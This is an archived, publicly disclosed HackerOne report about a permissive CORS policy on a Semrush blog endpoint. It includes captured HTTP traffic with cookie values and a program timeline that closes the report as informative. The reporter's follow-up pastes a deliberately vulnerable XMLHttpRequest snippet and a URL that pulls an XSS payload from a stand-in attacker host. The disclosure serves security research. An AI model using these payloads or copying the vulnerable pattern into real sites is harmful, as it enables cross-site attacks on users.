---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - env/web
substate: "informative"
weakness: null
enriched: true
body: true
date: 2018-01-11
submitted: 2017-11-09T18:08:30.767Z
bounty_usd: null
votes: 4
cve: []
program: "[[programs/semrush|Semrush]]"
reporter: "sureshbudharapu"
source: "https://hackerone.com/reports/288912"
title: "Cross-origin resource sharing"
---
# Cross-origin resource sharing

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 4 | **Program:** Semrush | **Disclosed:** 2018-01-11

- Report: [https://hackerone.com/reports/288912](https://hackerone.com/reports/288912)
- CWE: N/A
- Submitted: 2017-11-09T18:08:30.767Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

###Issue:Cross-origin resource sharing: arbitrary origin trusted

The application implements an HTML5 cross-origin resource sharing (CORS) policy for this request that allows access from any domain.

The application allowed access from the requested origin https://hhgdhgjgbrg.com

Since the Vary: Origin header was not present in the response, reverse proxies and intermediate servers may cache it. This may enable an attacker to carry out cache poisoning attacks.
**Issue background:**
An HTML5 cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request.

Trusting arbitrary origins effectively disables the same-origin policy, allowing two-way interaction by third-party web sites. Unless the response consists only of unprotected public content, this policy is likely to present a security risk.

If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. Even if it does not, attackers may be able to bypass any IP-based access controls by proxying through users' browsers.
 **remediation:**

Host:https://www.semrush.com
Path: /blog/ws/
remediation:Rather than using a wildcard or programmatically verifying supplied origins, use a whitelist of trusted domains.
Request:
` ` `
POST /blog/ws/?EIO=3&transport=polling&t=L-XUrv3&sid=GgyrWydG6cdnMzMxCIuZ HTTP/1.1
Host: www.semrush.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Content-type: text/plain;charset=UTF-8
Referer: https://www.semrush.com/blog/
Content-Length: 38
Cookie: ███; blog_split=C; ref_code=__default__; usertype=Free-User; marketing=%7B%22user_cmp%22%3A%22%22%2C%22user_label%22%3A%22%22%7D; localization=%7B%22locale%22%3A%22en%22%7D; db=us; _ga=GA1.2.1264834051.1510222356; _gid=GA1.2.837455256.1510222356; utz=Asia%2FKolkata; userdata=%7B%22tz%22%3A%22GMT+5.5%22%2C%22ol%22%3A%22en%22%7D; visit_first=1510222356000; io=GgyrWydG6cdnMzMxCIuZ; wp13557=UWYYADDDDDDMAZHBYLB-JMKI-XKAU-IWWJ-LMUVHMXKWMYJDHAXJKTTX-HVXB-XUWC-BYVI-KCVBHMXYUVKBDlLtkNlo_Jht; __uvt=; uvts=6k5thF30VCHYVUCC; XSRF-TOKEN=alfdcNxz1SnLcbyeUDtBHc7p5i0IgSWjkrXL10C6; community-semrush=XX2llfwaopEzko3IlrC5VPaXpFuQMqQVJvo3mdzN; exp__cid=3d0fa57b-7bf2-4c65-9b04-dd93cda4bddc; __insp_wid=826279527; __insp_slim=1510241796546; __insp_nv=true; __insp_targlpu=aHR0cHM6Ly93d3cuc2VtcnVzaC5jb20vYXBpLWRvY3VtZW50YXRpb24v; __insp_targlpt=U0VNcnVzaCBBUEkgfCBTRU1ydXNoIEVuZ2xpc2g%3D; __insp_norec_sess=true; _gat=1; _uetsid=_ueta0786e6a
Connection: close
1.Origin: https://hhgdhgjgbxg.com

35:42["online","{\"user\":147782577}"]
` ` `
Response:
` ` ` 
HTTP/1.1 400 Bad Request
Server: nginx
Date: Thu, 09 Nov 2017 15:58:45 GMT
1.Content-Type: application/json
Connection: close
1.Access-Control-Allow-Credentials: true
1.Access-Control-Allow-Origin: https://hhgdhgjgbxg.com
X-Frame-Options: SAMEORIGIN always
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Content-Length: 41

{"code":1,"message":"Session ID unknown"}
` ` `

**References:
Exploiting CORS Misconfigurations
**Vulnerability classifications**
CWE-942: Overly Permissive Cross-domain Whitelist

## Timeline

- **Report Filed**
- **2017-11-20** @alla: Thanks for the report, we will investigate this.
- **2017-11-21** @alla: Could you please describe security impact?
- **Report Needs More Info**
- **Report New**
- **2017-11-24** @sureshbudharapu: References: https://cwe.mitre.org/data/definitions/942.html
- **2017-11-24** @sureshbudharapu: **Example 1: Insecure response with wildcard '*' in Access-Control-Allow-Origin:** 
` ` `
**Request (note the 'Origin' header:)**
GET http://attacker.bar/test.php HTTP/1.1
Host: attacker.bar
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://example.foo/CORSexample1.html
Origin: http://example.foo
Connection: keep-alive
` ` `
` ` `
**Response (note the 'Access-Control-Allow-Origin' header:)**
HTTP/1.1 200 OK
Date: Mon, 07 Oct 2013 18:57:53 GMT
Server: Apache/2.2.22 (Debian)
X-Powered-By: PHP/5.4.4-14+deb7u3
Access-Control-Allow-Origin: *
Content-Length: 4
Keep-Alive: timeout=15, max=99
Connection: Keep-Alive
Content-Type: application/xml

[Response Body]
` ` `
` ` `
**Example 2: Input validation issue, XSS with CORS:** 
This code makes a request to the resource passed after the # character in the URL, initially used to get resources in the same server. 

Vulnerable code: 
<script>

var req = new XMLHttpRequest();

req.onreadystatechange = function() {
     if(req.readyState==4 && req.status==200) {
          document.getElementById("div1").innerHTML=req.responseText;
     }
}

var resource = location.hash.substring(1);
req.open("GET",resource,true);
req.send();
</script>

<body>
<div id="div1"></div>
</body>
` ` `
**For example, a request like this will show the contents of the profile.php file:**
http://example.foo/main.php#profile.php
 ` ` `
Request and response generated by this URL: 
GET http://example.foo/profile.php HTTP/1.1
Host: example.foo
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://example.foo/main.php
Connection: keep-alive

HTTP/1.1 200 OK
Date: Mon, 07 Oct 2013 18:20:48 GMT
Server: Apache/2.2.16 (Debian)
X-Powered-By: PHP/5.3.3-7+squeeze17
Vary: Accept-Encoding
Content-Length: 25
Keep-Alive: timeout=15, max=99
Connection: Keep-Alive
Content-Type: text/html

[Response Body]

` ` `
**Now, as there is no URL validation we can inject a remote script, that will be injected and executed in the context of the example.foo domain, with a URL like this:** 
http://example.foo/main.php#http://attacker.bar/file.php

` ` `
**Request and response generated by this URL:** 
GET http://attacker.bar/file.php HTTP/1.1
Host: attacker.bar
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://example.foo/main.php
Origin: http://example.foo
Connection: keep-alive
HTTP/1.1 200 OK
Date: Mon, 07 Oct 2013 19:00:32 GMT
Server: Apache/2.2.22 (Debian)
X-Powered-By: PHP/5.4.4-14+deb7u3
Access-Control-Allow-Origin: *
Vary: Accept-Encoding
Content-Length: 92
Keep-Alive: timeout=15, max=100
Connection: Keep-Alive
Content-Type: text/html

Injected Content from attacker.bar <img src="#" onerror="alert('Domain: '+document.domain)"> 
` ` `
- **2017-11-24** @alla: You give examples with other domains and tell what theoretically it can lead to. But it doesn't clear how it can be used in case of URL https://www.semrush.com/blog/
- **2017-11-24** @sureshbudharapu: sorry I show some example attack this kind of attacks can passible   Cross-origin resource sharing
- **2017-11-24** @sureshbudharapu: References: https://cwe.mitre.org/data/definitions/942.html
- **Report Informative**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **External User Joined**
